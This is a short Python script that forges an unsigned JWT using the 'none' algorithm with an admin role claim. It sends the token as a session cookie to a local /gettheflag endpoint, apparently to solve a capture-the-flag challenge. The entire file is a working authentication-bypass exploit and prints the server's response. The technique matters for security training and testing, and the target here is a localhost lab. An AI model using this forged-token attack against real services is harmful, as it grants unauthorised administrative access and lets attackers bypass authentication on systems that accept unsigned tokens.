import json
import base64
import urllib.request

def b64url(data):
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode()
    elif isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

# Craft unsigned JWT with admin role
header = {"alg": "none", "typ": "JWT"}
payload = {"username": "user", "role": "admin"}
jwt_token = f"{b64url(header)}.{b64url(payload)}."

print(f"Crafted JWT: {jwt_token}")

# Make request to /gettheflag with admin JWT
url = "http://127.0.0.1:5003/gettheflag"
req = urllib.request.Request(url)
req.add_header('Cookie', f'session={jwt_token}')

try:
    with urllib.request.urlopen(req) as response:
        content = response.read().decode('utf-8')
        print(f"\nStatus: {response.status}")
        print(f"Response:\n{content}")
except Exception as e:
    print(f"Error: {e}")

